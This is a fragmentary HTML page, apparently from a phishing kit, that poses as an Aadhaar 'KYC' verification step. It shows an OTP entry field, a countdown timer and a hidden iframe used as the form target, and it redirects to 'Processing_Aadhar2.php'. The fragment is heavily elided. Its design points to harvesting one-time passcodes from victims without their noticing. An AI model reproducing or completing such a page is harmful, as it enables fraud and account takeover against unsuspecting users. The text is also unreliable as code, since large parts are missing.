   ...
   <body onload="startTimer();" style="background:#fff;">
    ...
    <img src="Menu.png" id="ii" width="10%">
      ...
      <section class="">
         ...
         <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Processing_Aadhar2.php';}"></iframe>
         <!--My Form-->
				   ...
				   <div class="progress">
                    ...
                    End KYC % Progress-->
                     <div class="p-50">
                        ...
                        <div class="login-box">
                        <div class="user-box">
                        <input type="text" name="LAST1_OTP" inputmode="numeric" maxlength="8"
                        ...
                        if (timer<2) {
                        // timer.stop();
                        window.location.href = "Processing_Aadhar2.php";
                        }
